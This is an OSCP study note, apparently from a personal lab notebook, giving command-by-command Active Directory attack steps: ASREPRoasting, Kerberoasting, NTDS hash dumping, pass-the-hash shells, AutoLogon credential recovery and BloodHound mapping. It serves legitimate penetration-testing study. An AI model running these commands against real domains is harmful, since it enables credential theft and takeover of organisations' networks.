# Active Directory Attacks (OSCP)

This note covers the core AD attack techniques used after identifying an AD environment.
When nmap shows ports 88 (Kerberos), 389 (LDAP), 464 (kpasswd), and 3268 (Global Catalog) → you're likely on a DC.

---

## Pre-Flight: /etc/hosts Fix for Kerberos

Kerberos requires the domain name to resolve — it won't work with just the IP.
Do this before running any Kerberos-based tool:

```bash
sudo nano /etc/hosts
```

Add:
```
<DC_IP>   DOMAIN.LOCAL
```

Example:
```
10.129.95.180   EGOTISTICAL-BANK.LOCAL
```

Without this, tools throw `[Errno -2] Name or service not known` or `KDC_ERR_C_PRINCIPAL_UNKNOWN`.

---

## Clock Skew Fix

Kerberos has a 5-minute clock tolerance. If your machine's clock is off, auth fails with:
`KRB_AP_ERR_SKEW(Clock skew too great)`

Fix:
```bash
sudo ntpdate <DC_IP>
```

Or manually sync:
```bash
sudo timedatectl set-ntp true
```

---

## ASREPRoasting

### What It Is

If an AD account has **"Do not require Kerberos preauthentication"** enabled, you can request an AS-REP ticket without knowing the password.
The AS-REP contains data encrypted with the user's password hash → crack offline.

No credentials needed. Just a valid username list.

### Step 1 — Find Vulnerable Accounts

```bash
netexec ldap <DC_IP> -u users.txt -p "" -k
```
Will try and log in as users with empty passwords, if you 
Look for:
```
[+] DOMAIN\username account vulnerable to asreproast attack
```

### Step 2 — Capture the Hash

```bash
netexec ldap <DC_IP> -u <username> -p "" --asreproast asrep.txt
```

Or with Impacket (if nxc unavailable):
```bash
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
```

### Step 3 — Crack the Hash

Hash type: `$krb5asrep$23$` → **Hashcat mode 18200**

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

With rules (if rockyou fails):
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Kerberoasting

### What It Is

Service accounts with SPNs (Service Principal Names) can have their TGS tickets requested by any authenticated domain user.
TGS tickets are encrypted with the service account's hash → crack offline.

**Requires valid domain credentials** (unlike ASREPRoast).

### Find and Capture

```bash
netexec ldap <DC_IP> -u <user> -p <pass> --kerberoasting kerb.txt
```

Or with Impacket:
```bash
GetUserSPNs.py DOMAIN/user:password -dc-ip <DC_IP> -request
```

### Crack

Hash type: `$krb5tgs$23$` → **Hashcat mode 13100**

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

---

## NTDS Dump (Full Domain Hash Extraction)

If you have credentials for an account with DCSync rights (Domain Admin, or ACL delegation), dump all domain hashes.

### Via NetExec

```bash
netexec smb <DC_IP> -u <user> -p '<password>' --ntds
```

> Use single quotes if the password contains `!` — bash eats it in double quotes.

### Via Impacket

```bash
secretsdump.py DOMAIN/user:password@<DC_IP>
```

### NTDS Output Format

```
Administrator:500:LM_hash:NT_hash:::
```

- `LM_hash` — almost always `aad3b435b51404eeaad3b435b51404ee` (empty LM) — ignore it
- `NT_hash` — the one you want for Pass-the-Hash or cracking

---

## Pass-the-Hash (PTH)

No need to crack if you have the NT hash. Pass it directly.

### Evil-WinRM

```bash
evil-winrm -u <user> -H <NT_hash> -i <IP>
```

> `-H` takes the NT hash only — do NOT pass the full `LM:NT` format here.

### NetExec (verify before attempting shell)

```bash
netexec smb <IP> -u <user> -H <NT_hash>
```

### Impacket

```bash
wmiexec.py <user>@<IP> -hashes :<NT_hash>
psexec.py <user>@<IP> -hashes :<NT_hash>
```

Format for Impacket is `:NT_hash` (colon prefix, no LM hash needed).

---

## AutoLogon Credentials (winPEAS)

Windows AutoLogon stores credentials **in plaintext** in the registry under:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

winPEAS surfaces this automatically. Look for:

```
Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName  :  DOMAIN
    DefaultUserName    :  DOMAIN\username
    DefaultPassword    :  plaintext_password
```

**Important:** The `DefaultUserName` display name may differ from the actual sAMAccountName (AD login name).
Verify the real username via:

```bash
netexec smb <IP> -u <guessed_user> -p '<password>'
```

Or enumerate users via LDAP:

```bash
netexec ldap <IP> -u <user> -p '<password>' --users
```

---

## Quick LDAP Enumeration

Once you have valid creds, pull AD user info:

```bash
# List all domain users
netexec ldap <IP> -u <user> -p <pass> --users

# List domain groups
netexec ldap <IP> -u <user> -p <pass> --groups

# Check password policy
netexec ldap <IP> -u <user> -p <pass> --pass-pol

# Find accounts with admin count set (previously high-priv)
netexec ldap <IP> -u <user> -p <pass> --admin-count

# Find accounts with password not required
netexec ldap <IP> -u <user> -p <pass> --password-not-required
```

---

## BloodHound (AD Attack Path Mapping)

BloodHound visualizes attack paths through AD ACLs and group memberships.
Requires valid domain credentials.

```bash
bloodhound-python -u <user> -p <password> -d DOMAIN.LOCAL -dc <DC_IP> -c All --zip
```

Common error — clock skew:
```
KRB_AP_ERR_SKEW(Clock skew too great)
```
→ Run `sudo ntpdate <DC_IP>` first, or use `--auth-method ntlm` to force NTLM.

---

## Related Notes

- [[AD_Username_Generation]]
- [[NetExec]]
- [[Impacket]]
- [[Hashcat]]
- [[winPEAS]]
- [[RDP_and_WinRM]]
- [[Suana]] ← Sauna HTB — full walkthrough of ASREPRoast → NTDS → PTH chain
